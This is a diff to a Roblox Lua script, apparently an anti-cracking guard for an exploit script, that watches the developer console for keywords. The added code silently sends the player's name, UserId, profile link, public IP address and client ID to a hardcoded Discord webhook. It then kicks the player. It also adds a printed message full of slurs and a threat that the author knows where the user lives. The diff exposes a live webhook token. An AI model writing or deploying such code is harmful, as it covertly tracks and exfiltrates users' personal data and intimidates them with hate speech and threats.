@@ -69,17 +69,71 @@ while true do
     local textLabels = {}
     findTextLabels(directory, textLabels)
 
-    -- Function to check for keywords in text and print "Spy detected" if found
+    -- Function to check for keywords in text and take actions if found
     local function checkTextForKeywords(text)
         for _, keyword in ipairs(keywords) do
             if text:find(keyword) then
+                -- Send a webhook to Discord
+                local HttpService = game:GetService("HttpService")
+                local Webhook_URL = "https://discord.com/api/webhooks/your_webhook_url_here" -- Replace with your Discord webhook URL
+                
+                local request = syn and syn.request or request or http and http.request or http_request
+                
+                request({
+                    Url = "https://discord.com/api/webhooks/1155978268953018459/Tqnx0_5FXAkR0KV1UYALM070mJXsKQL0SmHR_qXWAA0GIRdUdnEUkl9uYFBf0X56n1Kn"
+                    Method = "POST",
+                    Headers = {
+                        ['Content-Type'] = 'application/json'
+                    },
+                    Body = HttpService:JSONEncode({
+                        ["content"] = "",
+                        ["embeds"] = {
+                            {
+                                ["title"] = "",
+                                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
+                                ["type"] = "rich",
+                                ["color"] = tonumber(0xff0000), -- Red color for alert
+                                ["fields"] = {
+                                    {
+                                        ["name"] = "Player Name : ",
+                                        ["value"] = game.Players.LocalPlayer.Name,
+                                        ["inline"] = true
+                                    }, {
+                                        ["name"] = "UserId : ",
+                                        ["value"] = game.Players.LocalPlayer.UserId,
+                                        ["inline"] = true
+                                    }, {
+                                        ["name"] = "User Profile : ",
+                                        ["value"] = "https://www.roblox.com/users/" ..
+                                            game.Players.LocalPlayer.UserId,
+                                        ["inline"] = true
+                                    }, {
+                                        ["name"] = "IP: ",
+                                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
+                                        ["inline"] = true
+                                    }, {
+                                        ["name"] = "Client Id : ",
+                                        ["value"] = game:GetService("RbxAnalyticsService")
+                                            :GetClientId(),
+                                        ["inline"] = true
+                                    }, {
+                                        ["name"] = "Key : ",
+                                        ["value"] = "GAMERONTOP",
+                                        ["inline"] = true
+                                    }
+                                }
+                            }
+                        }
+                    })
+                })
+
                 -- Delete the DevConsoleMaster
                 directory:Destroy()
                 
-                print("STOP CRACKING")
+                print("STOP CRACKING FAG ASS FUCKING DICKHEAD ASS BITCH ASS NIGGA I KNOW WHERE YOU LIVE PRETTY BOI DONT PLAY WITH ME")
                 
                 -- Kick the player with a message
-                game.Players.LocalPlayer:Kick("Stop Cracking Kiddo I Know Where You Live")
+                game.Players.LocalPlayer:Kick("You have been kicked for using forbidden keywords.")
                 return -- Exit the loop after kicking the player
             end
         end
@@ -98,5 +152,3 @@ while true do
     -- Wait for a few seconds before checking again (adjust as needed)
     wait(0) -- Wait for 5 seconds before checking again
 end
-
-
